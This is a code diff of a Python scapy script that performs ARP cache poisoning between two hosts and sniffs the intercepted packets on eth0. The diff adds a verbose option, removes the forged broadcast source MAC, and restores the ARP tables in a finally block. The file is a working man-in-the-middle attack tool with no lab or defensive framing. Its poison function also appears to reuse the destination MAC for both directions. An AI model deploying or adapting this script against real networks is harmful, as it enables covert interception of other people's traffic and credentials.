@@ -1,7 +1,8 @@
 import argparse
 import time
 import scapy.all as scapy
-from scapy.layers import inet
+import logging
+logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
 
 def optparsing() -> None:
     """
@@ -24,6 +25,13 @@ def optparsing() -> None:
         "dest_mac",
         help="Mac address of destination"
     )
+    parser.add_argument(
+        "-v",
+        "--verbose",
+        default=False,
+        action="store_true",
+        help="Print out all debug"
+    )
     return parser.parse_args()
 
 
@@ -36,9 +44,13 @@ def optparsing() -> None:
 #         print(answer)
 #     return answered_list[0][1].hwsrc
 
+def logger(message):
+    if args.verbose:
+        print(message)
+
 def spoof(src_ip, dest_ip, dest_mac):
     ## use local mac address as source
-    spoof_packet = scapy.ARP(op = 2, hwsrc="ff:ff:ff:ff:ff:ff", psrc = src_ip, hwdst = dest_mac, pdst = dest_ip)
+    spoof_packet = scapy.ARP(op = 2, psrc = src_ip, hwdst = dest_mac, pdst = dest_ip)
     scapy.send(spoof_packet, verbose = False)
 
 def restore(src_ip, src_mac, dest_ip, dest_mac):
@@ -47,51 +59,30 @@ def restore(src_ip, src_mac, dest_ip, dest_mac):
     scapy.send(restore_packet, count =1, verbose = False)
 
 def sniffer():
-    scapy.sniff(iface='eth0', store = False, prn = process_packet)
+    INTERFACE = 'eth0'
+    scapy.sniff(iface=INTERFACE, store = False, prn = process_packet)
 
 def process_packet(packet):
-    print('packet:', packet)
+    # print('packet:', packet)
+    packet.show()
 
 def poison(args):
-    # spoof(src_ip, dest_ip)
-    # spoof(dest_ip, src_ip)
     spoof(args.src_ip, args.dest_ip, args.dest_mac)
     spoof(args.dest_ip, args.src_ip, args.dest_mac)
 
 def esuna(args):
-    # restore(src_ip, dest_ip)
-    # restore(dest_ip, src_ip)
     restore(args.src_ip, args.src_mac, args.dest_ip, args.dest_mac)
     restore(args.dest_ip, args.dest_mac, args.src_ip, args.src_mac)
 
 def main():
-    print(args.src_ip)
-    # return
-    packets_sent = 0
     try:
-        while True:
-            # spoof(dest_ip, src_ip)
-            # spoof(src_ip, dest_ip)
-            poison(args)
-            packets_sent += 2
-
-            print("\r[+] Packets Sent: {}".format(packets_sent), end = "")
-            # packet = scapy.sniff(dest_ip)
-            # print('Packet:', packet)
-            sniffer()
-            break
-            time.sleep(2)
-        # restore(dest_ip, src_ip)
-        # restore(src_ip, dest_ip)
-        esuna(args)
-
-    except KeyboardInterrupt:
-        print("\n[-] Detected Ctrl + C..... Restoring the ARP Tables..... Be Patient")
-        # restore(dest_ip, src_ip)
-        # restore(src_ip, dest_ip)
-        esuna(args)
+        poison(args)
+        sniffer()
     except Exception as e:
-        print(e)
+        logger(e)
+    finally:
+        logger("..... Restoring the ARP Tables.....")
+        esuna(args)
 
 if __name__ == '__main__':
     args = optparsing()
